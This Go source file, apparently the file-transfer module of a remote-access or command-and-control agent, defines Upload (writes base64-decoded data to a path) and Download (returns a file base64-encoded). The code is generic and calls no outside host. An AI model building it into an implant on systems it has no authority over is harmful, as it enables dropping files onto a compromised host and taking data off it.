package agentfuncs

import (
	b64 "encoding/base64"
	"os"
	"fmt"
)

func Upload(path string, fileb64 string) string {
	dat, err := b64.StdEncoding.DecodeString(fileb64)
	if err != nil {
		return "[!] Upload failed: " + err.Error()
	}
	
	fd, err := os.Create(path)
	if err != nil {
		return "[!] Upload failed: " + err.Error()
	}
	defer fd.Close()

	numBytes, err := fd.Write(dat)
	if err != nil {
		return "[!] Upload failed: " + err.Error()
	}

	return fmt.Sprintf("[+] File uploaded successfully to %s\n  [*] %d bytes written.\n", path, numBytes)
}

func Download(path string) string {
	dat, err := os.ReadFile(path)
	if err != nil {
		return "[!] Download failed: " + err.Error()
	}

	enc := b64.StdEncoding.EncodeToString(dat)
	return enc
}